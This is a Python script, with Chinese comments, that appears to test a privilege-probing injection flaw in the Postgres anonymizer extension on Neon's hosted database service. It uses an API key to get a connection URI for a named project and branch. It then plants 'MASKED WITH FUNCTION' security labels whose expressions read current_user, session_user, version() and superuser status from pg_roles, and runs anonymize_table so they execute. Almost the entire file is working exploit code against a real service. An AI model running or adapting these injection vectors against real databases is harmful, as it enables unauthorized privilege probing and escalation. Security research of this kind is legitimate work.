# -*- coding: utf-8 -*-
"""br3 本地: masking_function 参数表达式注入验证 (concat(current_user::text))"""
import http.client, ssl, json, time, sys, os
sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))
from _neon_creds_stage import API_HOST, API_BASE, HEADERS_TEST
key = json.load(open(r'D:\scan\neon_report\_apikey.json'))['key']
ctx = ssl.create_default_context()
P = 'orange-sun-90493739'
BR3 = 'br-rapid-lake-w2aky5fq'

def req(path):
    for attempt in range(3):
        try:
            c = http.client.HTTPSConnection(API_HOST, timeout=25, context=ctx)
            h = {'User-Agent': 'Mozilla/5.0', 'Accept': 'application/json',
                 'Authorization': 'Bearer ' + key}
            h.update(HEADERS_TEST)
            c.request('GET', API_BASE + path, headers=h)
            r = c.getresponse(); raw = r.read()
            c.close()
            return r.status, raw
        except Exception as e:
            time.sleep(2)
    return None, None

st, raw = req('/projects/%s/connection_uri?database_name=neondb&role_name=neondb_owner&branch_id=%s' % (P, BR3))
uri = json.loads(raw).get('uri', '')
from urllib.parse import urlsplit, urlunsplit, parse_qsl, urlencode
parts = urlsplit(uri)
q = [(k, v) for k, v in parse_qsl(parts.query) if k != 'channel_binding']
uri = urlunsplit((parts.scheme, parts.netloc, parts.path, urlencode(q), parts.fragment))

import psycopg
with psycopg.connect(uri, connect_timeout=20) as conn:
    conn.autocommit = True
    cur = conn.cursor()
    # 恢复原始数据
    cur.execute("update public.sbx_anon_src set full_name = case id when 1 then 'Alice Victim' when 2 then 'Bob Victim' else 'Carol Victim' end, email = case id when 1 then 'alice@victim.com' when 2 then 'bob@victim.com' else 'carol@victim.com' end")
    vecs = [
        ('expr-current_user', 'MASKED WITH FUNCTION pg_catalog.concat(current_user::text)'),
        ('expr-session_user', 'MASKED WITH FUNCTION pg_catalog.concat(session_user::text, version())'),
        ('plain-md5', 'MASKED WITH FUNCTION pg_catalog.md5(now()::text)'),
        ('subquery', 'MASKED WITH FUNCTION pg_catalog.concat((select rolsuper::text from pg_roles where rolname=current_user))'),
    ]
    for tag, label in vecs:
        try:
            cur.execute("SECURITY LABEL FOR anon ON COLUMN public.sbx_anon_src.full_name IS '" + label.replace("'", "''") + "'")
            print('[%s] LABEL OK' % tag)
        except Exception as e:
            print('[%s] LABEL FAIL: %s' % (tag, str(e).split(chr(10))[0][:200]))
            continue
        try:
            cur.execute("select anon.anonymize_table('public.sbx_anon_src')")
            cur.execute('select id, full_name from public.sbx_anon_src order by id')
            print('  -> data:', cur.fetchall())
        except Exception as e:
            print('  -> ANON FAIL:', str(e).split(chr(10))[0][:200])
        # 清 label
        try:
            cur.execute("SECURITY LABEL FOR anon ON COLUMN public.sbx_anon_src.full_name IS 'MASKED'")
        except Exception:
            pass
        cur.execute("update public.sbx_anon_src set full_name = case id when 1 then 'Alice Victim' when 2 then 'Bob Victim' else 'Carol Victim' end")
        print()
